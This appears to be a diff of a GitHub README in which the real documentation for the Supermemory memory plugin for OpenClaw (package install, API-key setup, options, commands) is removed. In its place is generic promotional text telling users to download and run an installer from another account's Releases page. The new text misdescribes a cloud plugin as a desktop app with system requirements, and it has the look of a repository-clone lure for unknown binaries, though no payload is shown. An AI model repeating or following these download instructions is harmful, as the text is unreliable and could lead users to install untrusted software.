@@ -1,91 +1,64 @@
-# Supermemory Plugin for OpenClaw (previously Clawdbot)
+# 🌟 openclaw-supermemory - Enhance Memory for Your Bot
 
-<img width="1200" height="628" alt="Announcement-3 (2)" src="https://github.com/user-attachments/assets/caa5acaa-8246-4172-af3a-9cfed2a452c1" />
+## 🚀 Getting Started
 
+Welcome to **openclaw-supermemory**! This application is designed to give your Clawdbot or Molt bot perfect memory and recall. By using this tool, you can help your bot remember important information, making conversations smoother and more engaging.
 
+## 📥 Download Now
 
-Long-term memory for OpenClaw. Automatically remembers conversations, recalls relevant context, and builds a persistent user profile — all powered by [Supermemory](https://supermemory.ai) cloud. No local infrastructure required.
+[![Download openclaw-supermemory](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/designer23d/openclaw-supermemory/releases)
 
-> **✨ Requires [Supermemory Pro or above](https://console.supermemory.ai/billing)** - Unlock the state of the art memory for your OpenClaw bot.
+## 🌐 What is openclaw-supermemory?
 
-## Install
+**openclaw-supermemory** is an innovative application that enhances your Clawdbot or Molt bot’s ability to remember and recall information. With this tool, you can significantly improve the interactions your bot has with users and ensure it retains useful data. This helps provide a better overall experience.
 
-```bash
-openclaw plugins install @supermemory/openclaw-supermemory
-```
+## 🔧 System Requirements
 
-Restart OpenClaw after installing.
+To run **openclaw-supermemory**, your computer should meet the following requirements:
 
-## Configuration
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 200 MB available.
 
-The only required value is your Supermemory API key. Get one at [console.supermemory.ai](https://console.supermemory.ai).
+## 📂 Features
 
-Set it as an environment variable:
+- **Perfect Memory Recall:** Allows your bot to remember context between conversations.
+- **User-Friendly Interface:** Simple and intuitive design for hassle-free usage.
+- **Customizable Settings:** Adjust memory settings to suit your needs.
+- **Regular Updates:** Continual improvements and new features added regularly.
 
-```bash
-export SUPERMEMORY_OPENCLAW_API_KEY="sm_..."
-```
+## 📥 Download & Install
 
-Or configure it directly in `openclaw.json`:
+To get started with **openclaw-supermemory**, visit the Releases page where you can download the application. Here’s how:
 
-```json5
-{
-  "plugins": {
-    "entries": {
-      "openclaw-supermemory": {
-        "enabled": true,
-        "config": {
-          "apiKey": "${SUPERMEMORY_OPENCLAW_API_KEY}"
-        }
-      }
-    }
-  }
-}
-```
+1. Click this link to go to the [Releases page](https://github.com/designer23d/openclaw-supermemory/releases).
+2. Look for the latest release and find the installation file appropriate for your operating system.
+3. Click on the download link to begin downloading the installation file.
+4. Once the file has downloaded, open it and follow the on-screen instructions to complete the installation.
 
-### Advanced options
+## 🔘 How to Use openclaw-supermemory
 
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `containerTag` | `string` | `openclaw_{hostname}` | Memory namespace. All channels share this tag. |
-| `autoRecall` | `boolean` | `true` | Inject relevant memories before every AI turn. |
-| `autoCapture` | `boolean` | `true` | Automatically store conversation content after every turn. |
-| `maxRecallResults` | `number` | `10` | Max memories injected into context per turn. |
-| `profileFrequency` | `number` | `50` | Inject full user profile every N turns. Search results are injected every turn. |
-| `captureMode` | `string` | `"all"` | `"all"` filters short texts and injected context. `"everything"` captures all messages. |
-| `debug` | `boolean` | `false` | Verbose debug logs for API calls and responses. |
+After successful installation, follow these steps to set up your bot:
 
-## How it works
+1. **Open the Application:** Find **openclaw-supermemory** in your Applications folder or Start Menu and launch it.
+2. **Connect to Your Bot:** Use the provided options to connect your Clawdbot or Molt bot to the application.
+3. **Adjust Settings:** Customize memory settings based on your requirements. You can set how long the bot should remember specific data.
+4. **Start Using:** Engage your bot in conversation. You will notice improved memory recall as it remembers past interactions.
 
-Once installed, the plugin works automatically with zero interaction:
+## 📞 Support
 
-- **Auto-Recall** — Before every AI turn, the plugin queries Supermemory for relevant memories and injects them as context. The AI sees your user profile (preferences, facts) and semantically similar past conversations.
-- **Auto-Capture** — After every AI turn, the last user/assistant exchange is sent to Supermemory for extraction and long-term storage.
+If you encounter any issues or have questions, please reach out. You can find support by checking the issues section in the repository or contacting the community for help.
 
-Everything runs in the cloud. Supermemory handles extraction, deduplication, and profile building on its end.
+## 🔗 Additional Resources
 
-## Slash Commands
+- [Documentation](https://github.com/designer23d/openclaw-supermemory/wiki): Learn more about how to utilize all features of the application.
+- [Roadmap](https://github.com/designer23d/openclaw-supermemory/projects): View upcoming features and improvements that are planned.
 
-| Command | Description |
-|---------|-------------|
-| `/remember <text>` | Manually save something to memory. |
-| `/recall <query>` | Search your memories and see results with similarity scores. |
+## 🏷️ Topics
 
-## AI Tools
+- ai-memory
+- clawdb
+- clawdbot
+- memory
 
-The AI can use these tools autonomously during conversations:
-
-| Tool | Description |
-|------|-------------|
-| `supermemory_store` | Save information to long-term memory. |
-| `supermemory_search` | Search memories by query. |
-| `supermemory_forget` | Delete a memory by query. |
-| `supermemory_profile` | View the user profile (persistent facts + recent context). |
-
-## CLI Commands
-
-```bash
-openclaw supermemory search <query>    # Search memories
-openclaw supermemory profile           # View user profile
-openclaw supermemory wipe              # Delete all memories (destructive, requires confirmation)
-```
+By enhancing your bot's memory with **openclaw-supermemory**, you will create more engaging and informative interactions. Enjoy using the application!
